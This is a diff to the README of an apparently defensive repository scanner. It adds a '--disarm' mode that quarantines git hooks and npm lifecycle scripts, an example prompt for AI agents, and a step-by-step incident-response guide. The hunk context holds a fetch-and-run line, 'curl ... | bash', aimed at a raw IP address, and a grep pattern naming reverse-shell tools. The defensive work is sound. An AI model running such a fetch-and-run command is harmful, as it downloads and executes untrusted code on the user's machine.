@@ -116,14 +116,80 @@ curl -s http://194.38.20.12/update.sh | bash
 
 ---
 
-### Option B: Use with AI Agents (Claude Code, OpenCode, Cursor, Gemini)
+### Option B: Disarm & Neutralize Malicious Repos (`--disarm`)
+
+If threats are detected and you want to sanitize the repository so it is safe to inspect:
+
+```bash
+# Automatically quarantine hooks and sanitize config:
+safe-repo-scan /path/to/untrusted-repo --disarm
+
+# Or using the zero-dependency Bash scanner:
+safe-repo-scan-sh /path/to/untrusted-repo --disarm
+```
+
+**What `--disarm` does:**
+* **Quarantines Git Hooks:** Moves active hooks into `.git/hooks_quarantine/` and disables executable permissions.
+* **Sanitizes `.git/config`:** Safely strips hijacked settings (`fsmonitor`, `hooksPath`, `pager`) while saving a clean backup to `.git/config.backup`.
+* **Disarms Lifecycle Scripts:** Renames `preinstall` / `postinstall` in `package.json` to `disarmed_*` to prevent automatic execution during `npm install`.
+
+---
+
+### Option C: Use with AI Agents (Claude Code, OpenCode, Cursor, Gemini)
 
 Simply prompt your AI Agent:
 
-> *"Tolong audit repo ini dengan safe-repo-review sebelum melakukan apa-apa. Jangan jalankan git status atau npm install."*  
-> *(Please audit this repo with safe-repo-review first. Do not run git status or npm install.)*
+> *"Tolong audit repo ini dengan safe-repo-review sebelum melakukan apa-apa. Jika ada yang berbahaya, netralisir dengan --disarm."*  
+> *(Please audit this repo with safe-repo-review first. If threats are found, disarm them.)*
 
 The agent will strictly adhere to the zero-execution protocol and only use raw read primitives (`cat`, `grep`, `ls`) to verify repo safety.
+
+---
+
+## 🆘 Emergency Incident Response: What To Do If Already Exposed
+
+If you or your AI agent **already ran** `git status`, `git checkout`, `npm install`, or an unvetted setup script:
+
+### Step 1: Disconnect Internet Immediately
+Unplug your Ethernet cable or disable Wi-Fi. This halts ongoing secondary payload downloads and stops data exfiltration (stealing `.env` or SSH keys).
+
+### Step 2: Terminate Suspicious Processes
+Inspect and terminate any active reverse shells or downloaders:
+```bash
+# Check running background scripts:
+ps aux | grep -E '(curl|wget|nc|bash -i|python -c)'
+
+# Inspect active network connections:
+lsof -i -P -n
+
+# Kill malicious process:
+kill -9 <PID>
+```
+
+### Step 3: Neutralize or Delete the Repository
+```bash
+safe-repo-scan /path/to/suspicious-repo --disarm
+# or delete the repository completely:
+rm -rf /path/to/suspicious-repo
+```
+
+### Step 4: Check SSH Authorized Keys
+Ensure the attacker did not plant a persistence backdoor:
+```bash
+cat ~/.ssh/authorized_keys
+```
+Remove any unfamiliar keys immediately.
+
+### Step 5: Rotate Critical Secrets
+Using a separate, uncompromised device (like your smartphone):
+- Revoke and regenerate GitHub / GitLab Personal Access Tokens.
+- Rotate sensitive API keys (OpenAI, Anthropic, AWS, GCP, Stripe, Database secrets).
+- Invalidate active sessions or passwords.
+
+### Step 6: Scan with ClamAV / Local Antivirus
+```bash
+clamscan -r --bell -i ~/
+```
 
 ---
 
